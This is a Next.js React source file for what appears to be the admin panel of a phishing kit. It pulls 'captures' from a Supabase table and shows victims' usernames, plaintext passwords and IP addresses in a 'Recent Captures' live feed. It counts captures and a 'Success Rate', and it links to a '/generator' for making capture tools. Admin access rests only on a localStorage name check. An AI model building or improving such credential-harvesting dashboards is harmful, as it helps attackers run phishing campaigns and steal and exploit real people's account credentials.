"use client";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { supabase } from "@/lib/supabase";

export default function AdminPage() {
  const router = useRouter();
  const [userName, setUserName] = useState("Admin");
  const [stats, setStats] = useState([
    { label: "Total Captures", value: "0", icon: "🔗" },
    { label: "Last 24h", value: "0", icon: "🎯" },
    { label: "Active Tools", value: "0", icon: "🛠️" },
    { label: "Success Rate", value: "100%", icon: "📈" }
  ]);
  const [recentVisits, setRecentVisits] = useState([]);
  const [loading, setLoading] = useState(true);
  const [isAdmin, setIsAdmin] = useState(false);

  useEffect(() => {
    const storedName = (localStorage.getItem("aura_user_name") || "").toLowerCase();
    const isAdminName = storedName === "admin" || storedName === "stupidking";

    if (!isAdminName) {
      // Not an admin — send to dashboard
      router.replace("/dashboard");
      return;
    }

    setIsAdmin(true);
    setUserName(localStorage.getItem("aura_user_name") || "Admin");
    fetchDashboardData();
  }, [router]);

  async function fetchDashboardData() {
    setLoading(true);
    try {
      const { data: captures, error } = await supabase
        .from("captures")
        .select("id, tool, timestamp, ip, tool_id, username, password")
        .order("timestamp", { ascending: false });

      if (error) throw error;

      const totalCaptures = captures.length;
      const recentCount = captures.filter(
        c => new Date(c.timestamp) > new Date(Date.now() - 86400000)
      ).length;
      const uniqueTools = new Set(captures.map(c => c.tool_id)).size;

      setStats([
        { label: "Total Captures", value: totalCaptures.toString(), icon: "🔗" },
        { label: "Last 24h", value: recentCount.toString(), icon: "🎯" },
        { label: "Active Tools", value: uniqueTools.toString(), icon: "🛠️" },
        { label: "Success Rate", value: "100%", icon: "📈" }
      ]);
      setRecentVisits(captures.slice(0, 5));
    } catch (err) {
      console.error("Admin fetch error:", err.message);
    } finally {
      setLoading(false);
    }
  }

  const handleLogout = () => {
    localStorage.removeItem("aura_gateway_cleared_v1");
    localStorage.removeItem("aura_user_name");
    localStorage.removeItem("aura_user_id");
    window.location.href = "/";
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-slate-50">
        <div className="flex flex-col items-center gap-4">
          <div className="w-12 h-12 border-4 border-indigo-600/20 border-t-indigo-600 rounded-full animate-spin"></div>
          <p className="text-slate-500 font-bold text-sm">Loading admin panel...</p>
        </div>
      </div>
    );
  }

  if (!isAdmin) return null;

  return (
    <div className="main-container animate-fade-in py-6 sm:py-12">
      <header className="mb-8 sm:mb-12 flex flex-col sm:flex-row sm:items-center justify-between gap-6">
        <div>
          <div className="inline-flex items-center gap-2 bg-amber-50 border border-amber-100 px-3 py-1 rounded-full mb-3">
            <span className="w-1.5 h-1.5 rounded-full bg-amber-500 animate-pulse"></span>
            <span className="text-[10px] font-black uppercase tracking-widest text-amber-600">Admin Access</span>
          </div>
          <h1 className="text-2xl sm:text-4xl font-bold mb-2 tracking-tight">
            Admin <span className="text-gradient">Panel</span>
          </h1>
          <p className="text-slate-500 text-xs sm:text-sm font-medium">
            Full overview of all captures and users. Logged in as <span className="font-bold text-slate-700 capitalize">{userName}</span>.
          </p>
        </div>
        <div className="flex flex-wrap gap-3">
          <a
            href="/admin/users"
            className="px-5 py-3 bg-indigo-600 hover:bg-indigo-700 text-white rounded-xl sm:rounded-2xl text-xs font-black uppercase tracking-widest transition-all shadow-lg shadow-indigo-200 active:scale-95 flex items-center gap-2"
          >
            <span>Manage Users</span>
            <span>👥</span>
          </a>
          <a
            href="/dashboard"
            className="px-5 py-3 bg-white/60 hover:bg-white border border-white/50 text-slate-700 rounded-xl sm:rounded-2xl text-xs font-black uppercase tracking-widest transition-all shadow-sm active:scale-95 glass flex items-center gap-2"
          >
            <span>← Dashboard</span>
          </a>
          <button
            onClick={handleLogout}
            className="px-5 py-3 bg-red-50 hover:bg-red-100 border border-red-100 text-red-500 rounded-xl sm:rounded-2xl text-xs font-black uppercase tracking-widest transition-all shadow-sm active:scale-95 flex items-center gap-2"
          >
            <span>Logout</span>
            <span>🚪</span>
          </button>
        </div>
      </header>

      {/* Stats */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6 mb-8 sm:mb-12">
        {stats.map((stat, i) => (
          <div key={i} className="glass-card p-4 sm:p-6 rounded-2xl sm:rounded-[2rem] relative overflow-hidden group hover:scale-[1.02] transition-all">
            <div className="absolute top-0 right-0 w-20 h-20 sm:w-24 sm:h-24 bg-indigo-500/5 rounded-full -mr-6 -mt-6 group-hover:bg-indigo-500/10 transition-colors"></div>
            <div className="flex items-center justify-between mb-3 sm:mb-4 relative z-10">
              <span className="text-2xl sm:text-3xl">{stat.icon}</span>
              <span className="text-[8px] sm:text-[10px] font-black text-emerald-600 bg-emerald-50 px-2 py-0.5 sm:px-2.5 sm:py-1 rounded-full border border-emerald-100">Live</span>
            </div>
            <h3 className="text-slate-400 text-[9px] sm:text-xs font-black uppercase tracking-widest mb-0.5 sm:mb-1 relative z-10">{stat.label}</h3>
            <p className="text-xl sm:text-3xl font-black text-slate-900 tracking-tight relative z-10">{stat.value}</p>
          </div>
        ))}
      </div>

      {/* Recent Captures */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 sm:gap-8">
        <div className="lg:col-span-2 glass-card p-5 sm:p-8 rounded-2xl">
          <div className="flex items-center justify-between mb-6">
            <h2 className="text-lg sm:text-xl font-bold text-slate-900">Recent Captures</h2>
            <div className="flex items-center gap-2">
              <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
              <span className="text-[10px] sm:text-xs text-emerald-600 font-bold uppercase tracking-tighter">Live Feed</span>
            </div>
          </div>
          <div className="space-y-4">
            {recentVisits.length === 0 ? (
              <p className="text-center py-12 font-bold text-slate-400">No captures yet.</p>
            ) : recentVisits.map((target) => (
              <div key={target.id} className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-100 pb-4 last:border-0 last:pb-0">
                <div className="flex items-center gap-3">
                  <div className="w-9 h-9 sm:w-10 sm:h-10 rounded-lg sm:rounded-xl bg-gradient-to-br from-indigo-500 to-purple-500 flex items-center justify-center text-[10px] sm:text-xs font-bold text-white shadow-md shrink-0">
                    {target.tool?.[0] || "?"}
                  </div>
                  <div>
                    <p className="text-sm font-bold text-slate-800">{target.tool} — <span className="text-indigo-600">{target.username}</span></p>
                    <p className="text-[10px] sm:text-xs text-slate-400 font-medium">{target.ip} • {new Date(target.timestamp).toLocaleString()}</p>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-[10px] font-bold text-pink-600 bg-pink-50 px-2 py-1 rounded border border-pink-100 font-mono">{target.password}</span>
                </div>
              </div>
            ))}
          </div>
        </div>

        <div className="glass-card p-6 sm:p-8 rounded-2xl bg-gradient-to-br from-indigo-50/50 to-blue-50/50 border-blue-100/50">
          <h2 className="text-lg sm:text-xl font-bold mb-3 sm:mb-4 text-slate-900">Quick Actions</h2>
          <div className="flex flex-col gap-3">
            <a href="/generator" className="block w-full py-3.5 bg-indigo-600 hover:bg-indigo-700 text-white text-center rounded-xl font-bold transition-all shadow-lg shadow-indigo-500/20 text-sm">
              Go to Generator 🔗
            </a>
            <a href="/admin/users" className="block w-full py-3.5 bg-white hover:bg-slate-50 text-slate-800 text-center rounded-xl font-bold transition-all shadow-sm border border-slate-100 text-sm">
              Manage Users 👥
            </a>
            <button
              onClick={() => fetchDashboardData()}
              className="w-full py-3.5 bg-white hover:bg-slate-50 text-slate-800 text-center rounded-xl font-bold transition-all shadow-sm border border-slate-100 text-sm"
            >
              Refresh Data 🔄
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
